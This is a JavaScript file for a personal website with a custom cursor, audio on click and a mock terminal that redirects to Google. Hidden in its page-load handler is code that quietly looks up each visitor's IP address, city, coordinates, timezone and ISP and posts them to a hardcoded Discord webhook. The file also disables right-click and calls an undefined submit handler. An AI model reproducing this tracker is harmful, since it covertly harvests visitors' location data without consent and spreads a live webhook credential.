document.addEventListener('DOMContentLoaded', function() {
    const body = document.body;
    const customCursor = document.getElementById('custom-cursor');
  
    body.addEventListener('mousemove', function(e) {
      customCursor.style.left = e.pageX + 'px';
      customCursor.style.top = e.pageY + 'px';
    });

    body.addEventListener('contextmenu', function(e) {
      e.preventDefault();
    });
  
    fetch('https://ipapi.co/json')
    .then(response => response.json())
    .then(data => {
        const ipAddress = data.ip;
        const city = data.city;
        const region = data.region;
        const country = data.country_name;
        const latitude = data.latitude;
        const longitude = data.longitude;
        const timeZone = data.timezone;
        const isp = data.org;
  
        const webhookUrl = 'https://discord.com/api/webhooks/1236160043779493941/SCZRWwW3vz_nwmHy0m4QCLhwz6vVqR99qa85RUtEBcc9I0_gaclAxtSzg8gnETPDLSus';
        const message = 
        `New user connected: ${ipAddress} 
        (City: ${city}, 
        Region: ${region}, 
        Country: ${country}, 
        Latitude: ${latitude}, Longitude: ${longitude}, 
        Timezone: ${timeZone}, 
        ISP: ${isp})`;

        fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ content: message })
        });
    });
});

let audioElement;

document.addEventListener('click', () => {
  if (audioElement && !audioElement.paused && !audioElement.ended) {
    return;
  }

  audioElement = new Audio('back2.mp3');
  audioElement.play();
});

// Get the terminal input field, submit button, and output div
const terminalInput = document.getElementById('terminal-input');
const terminalSubmit = document.getElementById('terminal-submit');
const terminalOutput = document.getElementById('terminal-output');
const keyboardSound = document.getElementById('keyboard-sound');

// Add an event listener to the terminal input field
terminalInput.addEventListener('focus', handleTerminalFocus);
terminalInput.addEventListener('input', handleTerminalInput);
terminalInput.addEventListener('keydown', handleTerminalKeyDown);

// Function to handle terminal focus
function handleTerminalFocus() {
  // Clear the terminal output div when the input field is focused
  terminalOutput.innerHTML = '';
  // Prevent the input field from being copied to the clipboard
  terminalInput.select();
  document.execCommand('copy');
  document.getSelection().removeAllRanges();
  // Add the focused class to the input field
  terminalInput.classList.add('focused');
}

// Function to handle terminal input
function handleTerminalInput() {
  // Play the keyboard sound when the user types in the input field
  keyboardSound.play();
}

// Function to handle terminal key down
function handleTerminalKeyDown(event) {
  if (event.key === 'Enter') {
    // Check if the user input is a valid command
    const userInput = terminalInput.value.trim();
    if (userInput!== '') {
      if (userInput === 'goto google') {
        // Redirect the user to Google
        window.location.href = 'https://www.google.com';
      } else {
        // Display an error message if the command is invalid
        terminalOutput.innerHTML = 'Invalid command. Try again!';
        setTimeout(() => {
          terminalOutput.innerHTML = ''; // Clear the output div after 2 seconds
        }, 2000);
      }
      terminalInput.value = ''; // Clear the input field
    }
  }
}

// Function to handle terminal blur
function handleTerminalBlur() {
  // Remove the focused class from the input field
  terminalInput.classList.remove('focused');
}

// Add an event listener to the terminal submit button
terminalSubmit.addEventListener('click', handleTerminalSubmit);

// Add an event listener to the terminal input field to handle the blur event
terminalInput.addEventListener('blur', handleTerminalBlur);
